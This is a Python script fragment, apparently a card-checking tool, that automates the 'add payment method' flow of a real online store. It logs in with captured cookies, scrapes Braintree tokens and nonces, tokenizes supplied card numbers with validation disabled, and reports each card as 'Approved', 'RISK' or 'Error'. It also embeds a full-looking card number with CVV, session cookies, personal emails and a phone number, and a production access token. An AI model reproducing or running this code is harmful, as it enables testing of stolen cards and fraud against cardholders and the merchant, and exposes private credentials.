    # 'cookie': '_gcl_au=1.1.434984831.1724093246; _ga=GA1.1.210261757.1724093246; _pin_unauth=dWlkPVlqUmpNalExWmpjdE5HTTRNQzAwWXpreExXRmtOelV0TURSbU5qVXlaV0ZsT1dZMA; cookieyes-consent=consentid:ZjQxejdkaFU0Q3pNMHpkZFJGUndpZ0ZYYng3REwxMmk,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _fbp=fb.1.1724093250124.81672869775922913; _derived_epik=dj0yJnU9enNQang1aWhSWFJjZnR3ZzFJcGdUbnNxRmNWbEk3bWImbj1UVk9wZGZ4TmRZTDYyUEtESEQ3THdBJm09NCZ0PUFBQUFBR2JGSUxnJnJtPTQmcnQ9QUFBQUFHYkZJTGcmc3A9Mg; ct_sfw_pass_key=9b8cfc83a132648e3968735bfd19567a0; yotpo_pixel=b96a9e1b-e817-4c65-a3a2-60ebfd08d68e; wickedfu_null=%7B%22url%22%3A%22https%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%3Futm_source%3DDirect%26utm_medium%3DDirect%26utm_campaign%3DDirect%26utm_content%3Datrantil.com%252Fmy-account%252Fadd-payment-method%26utm_term%3DOrganic%2520traffic%22%2C%22referrer%22%3A%22%22%2C%22time%22%3A1724976961119%2C%22c%22%3A4723%7D; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://atrantil.com/my-account/; last_pysTrafficSource=direct; wordpress_logged_in_609f678b007c0edeaa61db1e62c0384e=yuihghhg%7C1726186792%7CDQmhYIds6EGMcZjLwcMMODjChuIysjLmCdZMuxWqJQk%7C6780c210994e703d0482fde5c35f8586ec92d96227ae56e7f91f15d2a9ae5e91; wfwaf-authcookie-65d930f6b4b52d59823a65dc658b1ad9=27878%7Cother%7Cread%7C0de9f75b02bc79a1f87747b15e043db939037c85cad7c7a7c8dbea5928941093; pys_advanced_form_data={%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rgrgrgrgrgrgrggr@gmail.com%22%2C%22phone%22:%222153652415%22%2C%22emails%22:[%22yuihghhg@gmail.com%22%2C%22moh5527vbnm@gmail.com%22]%2C%22phones%22:[%222153652415%22]}; PHPSESSID=ac5f9c03588be89134076edae9310850; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-30%2003%3A47%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-08-30%2003%3A47%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _sp_ses.8d3e=*; pys_session_limit=true; pys_start_session=true; last_pys_landing_page=https://atrantil.com/my-account/add-payment-method/; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F; ss_enduser_cookie|67ef42d89a=eff1c341-1016-4578-85b3-19652e61a8a0; _ga_N0D7FWVJF6=GS1.1.1724989672.5.1.1724989762.55.1.1628938613; _uetsid=09b96dc0666511ef8a0dc3ccbc0fc1e8; _uetvid=83e094e05e5b11ef9a5de103894ef53f; _sp_id.8d3e=cf908450f56797e2.1724093245.5.1724989811.1724978035',
    'pragma': 'no-cache',
    'referer': 'https://atrantil.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://atrantil.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)

	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)

	dec = base64.b64decode(enc).decode('utf-8')

	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
#7


	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '62480b41-cfe0-46bb-98c8-ba8ded261d5f',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'hhfhfbfv',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"62480b41-cfe0-46bb-98c8-ba8ded261d5f"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4033060035832549","expirationMonth":"01","expirationYear":"2029","cvv":"642","billingAddress":{"postalCode":"10080","streetAddress":"hhfhfbfv"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
#8

	headers = {
    'authority': 'atrantil.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gcl_au=1.1.434984831.1724093246; _ga=GA1.1.210261757.1724093246; _pin_unauth=dWlkPVlqUmpNalExWmpjdE5HTTRNQzAwWXpreExXRmtOelV0TURSbU5qVXlaV0ZsT1dZMA; cookieyes-consent=consentid:ZjQxejdkaFU0Q3pNMHpkZFJGUndpZ0ZYYng3REwxMmk,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _fbp=fb.1.1724093250124.81672869775922913; _derived_epik=dj0yJnU9enNQang1aWhSWFJjZnR3ZzFJcGdUbnNxRmNWbEk3bWImbj1UVk9wZGZ4TmRZTDYyUEtESEQ3THdBJm09NCZ0PUFBQUFBR2JGSUxnJnJtPTQmcnQ9QUFBQUFHYkZJTGcmc3A9Mg; ct_sfw_pass_key=9b8cfc83a132648e3968735bfd19567a0; yotpo_pixel=b96a9e1b-e817-4c65-a3a2-60ebfd08d68e; wickedfu_null=%7B%22url%22%3A%22https%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%3Futm_source%3DDirect%26utm_medium%3DDirect%26utm_campaign%3DDirect%26utm_content%3Datrantil.com%252Fmy-account%252Fadd-payment-method%26utm_term%3DOrganic%2520traffic%22%2C%22referrer%22%3A%22%22%2C%22time%22%3A1724976961119%2C%22c%22%3A4723%7D; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://atrantil.com/my-account/; last_pysTrafficSource=direct; wordpress_logged_in_609f678b007c0edeaa61db1e62c0384e=yuihghhg%7C1726186792%7CDQmhYIds6EGMcZjLwcMMODjChuIysjLmCdZMuxWqJQk%7C6780c210994e703d0482fde5c35f8586ec92d96227ae56e7f91f15d2a9ae5e91; wfwaf-authcookie-65d930f6b4b52d59823a65dc658b1ad9=27878%7Cother%7Cread%7C0de9f75b02bc79a1f87747b15e043db939037c85cad7c7a7c8dbea5928941093; pys_advanced_form_data={%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rgrgrgrgrgrgrggr@gmail.com%22%2C%22phone%22:%222153652415%22%2C%22emails%22:[%22yuihghhg@gmail.com%22%2C%22moh5527vbnm@gmail.com%22]%2C%22phones%22:[%222153652415%22]}; _sp_ses.8d3e=*; pys_session_limit=true; last_pys_landing_page=https://atrantil.com/my-account/add-payment-method/; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F; _uetsid=09b96dc0666511ef8a0dc3ccbc0fc1e8; _uetvid=83e094e05e5b11ef9a5de103894ef53f; _sp_id.8d3e=cf908450f56797e2.1724093245.5.1724990102.1724978035; _ga_N0D7FWVJF6=GS1.1.1724989672.5.1.1724990108.60.1.1628938613',
    'origin': 'https://atrantil.com',
    'pragma': 'no-cache',
    'referer': 'https://atrantil.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key':tok,
    'braintree_cc_device_data': '{"device_session_id":"f4d33d6717c78e59e8d88f8a2ba8d83f","fraud_merchant_id":null,"correlation_id":"62480b41-cfe0-46bb-98c8-ba8ded26"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/h6nck7m2yyh6mqk4/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/h6nck7m2yyh6mqk4"},"merchantId":"h6nck7m2yyh6mqk4","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"h6nck7m2yyh6mqk4","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3333843690920608617","accessToken":"access_token$production$h6nck7m2yyh6mqk4$c17263feed9f66d5cc7e08f975927dd8","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"KBS Research","clientId":"AZ2WICgQ3fCYcNKRNgw9m3wd5_brlV542A4KeOL3mkkw11N4itXNyWxL_R7KGD0tX8Ssa3bEiyGG10gc","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"kbsresearch_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce':add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://atrantil.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
	pattern = r'Reason: (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
